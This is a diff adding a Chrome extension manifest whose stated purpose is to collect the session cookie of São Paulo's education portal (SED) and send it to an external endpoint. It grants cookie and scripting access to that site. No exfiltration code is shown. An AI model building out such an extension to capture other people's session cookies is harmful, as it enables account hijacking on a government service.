@@ -1,0 +1,23 @@
+{
+  "manifest_version": 3,
+  "name": "Enviar Cookie SED",
+  "version": "1.0",
+  "description": "Coleta o cookie SED e envia para um endpoint externo.",
+  "permissions": [
+    "cookies",
+    "scripting",
+    "activeTab"
+  ],
+  "host_permissions": [
+    "https://sed.educacao.sp.gov.br/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["https://sed.educacao.sp.gov.br/Inicio"],
+      "js": ["content.js"]
+    }
+  ]
+}
